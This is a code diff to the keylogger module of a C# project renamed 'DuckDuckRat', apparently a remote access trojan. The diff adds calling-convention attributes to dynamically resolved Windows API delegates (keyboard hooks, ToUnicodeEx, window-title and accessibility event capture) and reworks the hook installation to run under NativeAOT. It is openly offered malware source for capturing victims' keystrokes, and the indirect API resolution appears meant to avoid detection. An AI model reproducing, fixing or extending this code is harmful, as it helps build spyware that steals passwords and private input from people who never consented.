@@ -3,7 +3,7 @@ using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.IO;
 
-namespace FinalBot.Modules
+namespace DuckDuckRat.Modules
 {
     public static class KeyloggerModule
     {
@@ -25,47 +25,58 @@ namespace FinalBot.Modules
         public static bool IsTerminalActive => _isTerminalActive;
         private static bool _started = false; // Prevent thread leakage
 
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr LkProc(int n, IntPtr w, IntPtr l);
 
         private static class Native
         {
-            public static SetHookDelegate? SetHook => VanguardCore.SafetyManager.ApiInterface.Get<SetHookDelegate>("SetWindowsHookExW");
-            public static UnhookDelegate? Unhook => VanguardCore.SafetyManager.ApiInterface.Get<UnhookDelegate>("UnhookWindowsHookEx");
-            public static CallNextDelegate? CallNext => VanguardCore.SafetyManager.ApiInterface.Get<CallNextDelegate>("CallNextHookEx");
-            public static GetModDelegate? GetMod => VanguardCore.SafetyManager.ApiInterface.Get<GetModDelegate>("GetModuleHandleW");
-            public static GetMsgDelegate? GetMsg => VanguardCore.SafetyManager.ApiInterface.Get<GetMsgDelegate>("GetMessageW");
-            public static TransMsgDelegate? TransMsg => VanguardCore.SafetyManager.ApiInterface.Get<TransMsgDelegate>("TranslateMessage");
-            public static DispMsgDelegate? DispMsg => VanguardCore.SafetyManager.ApiInterface.Get<DispMsgDelegate>("DispatchMessageW");
+            public static SetHookDelegate? SetHook => DuckDuckRat.SafetyManager.ApiInterface.Get<SetHookDelegate>("SetWindowsHookExW");
+            public static UnhookDelegate? Unhook => DuckDuckRat.SafetyManager.ApiInterface.Get<UnhookDelegate>("UnhookWindowsHookEx");
+            public static CallNextDelegate? CallNext => DuckDuckRat.SafetyManager.ApiInterface.Get<CallNextDelegate>("CallNextHookEx");
+            public static GetModDelegate? GetMod => DuckDuckRat.SafetyManager.ApiInterface.Get<GetModDelegate>("GetModuleHandleW");
+            public static GetMsgDelegate? GetMsg => DuckDuckRat.SafetyManager.ApiInterface.Get<GetMsgDelegate>("GetMessageW");
+            public static TransMsgDelegate? TransMsg => DuckDuckRat.SafetyManager.ApiInterface.Get<TransMsgDelegate>("TranslateMessage");
+            public static DispMsgDelegate? DispMsg => DuckDuckRat.SafetyManager.ApiInterface.Get<DispMsgDelegate>("DispatchMessageW");
 
             // Keyboard Layout Support
-            public static GetForegroundDelegate? GetForeground => VanguardCore.SafetyManager.ApiInterface.Get<GetForegroundDelegate>("GetForegroundWindow");
-            public static GetWindowThreadProcessIdDelegate? GetThreadProcess => VanguardCore.SafetyManager.ApiInterface.Get<GetWindowThreadProcessIdDelegate>("GetWindowThreadProcessId");
-            public static GetLayoutDelegate? GetLayout => VanguardCore.SafetyManager.ApiInterface.Get<GetLayoutDelegate>("GetKeyboardLayout");
-            public static GetKeyStateDelegate? GetKeyState => VanguardCore.SafetyManager.ApiInterface.Get<GetKeyStateDelegate>("GetKeyState");
-            public static ToUnicodeExDelegate? ToUnicode => VanguardCore.SafetyManager.ApiInterface.Get<ToUnicodeExDelegate>("ToUnicodeEx");
-            public static GetWindowTextDelegate? GetText => VanguardCore.SafetyManager.ApiInterface.Get<GetWindowTextDelegate>("GetWindowTextW");
+            public static GetForegroundDelegate? GetForeground => DuckDuckRat.SafetyManager.ApiInterface.Get<GetForegroundDelegate>("GetForegroundWindow");
+            public static GetWindowThreadProcessIdDelegate? GetThreadProcess => DuckDuckRat.SafetyManager.ApiInterface.Get<GetWindowThreadProcessIdDelegate>("GetWindowThreadProcessId");
+            public static GetLayoutDelegate? GetLayout => DuckDuckRat.SafetyManager.ApiInterface.Get<GetLayoutDelegate>("GetKeyboardLayout");
+            public static GetKeyStateDelegate? GetKeyState => DuckDuckRat.SafetyManager.ApiInterface.Get<GetKeyStateDelegate>("GetKeyState");
+            public static ToUnicodeExDelegate? ToUnicode => DuckDuckRat.SafetyManager.ApiInterface.Get<ToUnicodeExDelegate>("ToUnicodeEx");
+            public static GetWindowTextDelegate? GetText => DuckDuckRat.SafetyManager.ApiInterface.Get<GetWindowTextDelegate>("GetWindowTextW");
 
             // WinEvent & Accessibility Support
-            public static SetEventHookDelegate? SetEventHook => VanguardCore.SafetyManager.ApiInterface.Get<SetEventHookDelegate>("SetWinEventHook");
-            public static UnhookEventDelegate? UnhookEvent => VanguardCore.SafetyManager.ApiInterface.Get<UnhookEventDelegate>("UnhookWinEvent");
+            public static SetEventHookDelegate? SetEventHook => DuckDuckRat.SafetyManager.ApiInterface.Get<SetEventHookDelegate>("SetWinEventHook");
+            public static UnhookEventDelegate? UnhookEvent => DuckDuckRat.SafetyManager.ApiInterface.Get<UnhookEventDelegate>("UnhookWinEvent");
             public static AccFromEventDelegate? AccFromEvent {
                 get {
-                    IntPtr ptr = VanguardCore.SafetyManager.ApiInterface.Resolve("oleacc.dll", "AccessibleObjectFromEvent");
+                    IntPtr ptr = DuckDuckRat.SafetyManager.ApiInterface.Resolve("oleacc.dll", "AccessibleObjectFromEvent");
                     return ptr != IntPtr.Zero ? Marshal.GetDelegateForFunctionPointer<AccFromEventDelegate>(ptr) : null;
                 }
             }
         }
 
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr GetForegroundDelegate();
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate uint GetWindowThreadProcessIdDelegate(IntPtr hWnd, out uint lpdwProcessId);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr GetLayoutDelegate(uint dwThreadId);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate short GetKeyStateDelegate(int nVirtKey);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
         private delegate int ToUnicodeExDelegate(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
         private delegate int GetWindowTextDelegate(IntPtr hWnd, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder lpString, int nMaxCount);
 
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr SetEventHookDelegate(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool UnhookEventDelegate(IntPtr hWinEventHook);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate int AccFromEventDelegate(IntPtr hwnd, uint idObject, uint idChild, out IAccessible ppvObject, out object pvarChild);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);
 
         [ComImport, Guid("618730e0-3c3d-11cf-810c-00aa00389b71"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
@@ -76,12 +87,19 @@ namespace FinalBot.Modules
             [PreserveSig] int get_accValue(object varChild, out string pszValue);
         }
 
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr SetHookDelegate(int id, LkProc lpfn, IntPtr hMod, uint dwThreadId);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool UnhookDelegate(IntPtr hhk);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr CallNextDelegate(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-        private delegate IntPtr GetModDelegate(string lpModuleName);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+        private delegate IntPtr GetModDelegate(string? lpModuleName);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate int GetMsgDelegate(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool TransMsgDelegate([In] ref MSG lpMsg);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate IntPtr DispMsgDelegate([In] ref MSG lpMsg);
 
         [StructLayout(LayoutKind.Sequential)]
@@ -176,16 +194,14 @@ namespace FinalBot.Modules
         {
             try
             {
-                using (Process curProcess = Process.GetCurrentProcess())
-                using (ProcessModule? curModule = curProcess.MainModule)
-                {
-                    if (curModule == null) return IntPtr.Zero;
-                    var setHook = Native.SetHook;
-                    var getMod = Native.GetMod;
-                    if (setHook == null || getMod == null) return IntPtr.Zero;
+                var setHook = Native.SetHook;
+                var getMod = Native.GetMod;
+                if (setHook == null || getMod == null) return IntPtr.Zero;
 
-                    return setHook(_hType, proc, getMod(curModule.ModuleName), 0);
-                }
+                // Passing null to GetModuleHandleW returns the handle for the current process executable.
+                // This is the most reliable way in NativeAOT to avoid Process.MainModule issues.
+                IntPtr hMod = getMod(null);
+                return setHook(_hType, proc, hMod, 0);
             }
             catch { return IntPtr.Zero; }
         }
@@ -390,3 +406,5 @@ namespace FinalBot.Modules
         }
     }
 }
+
+
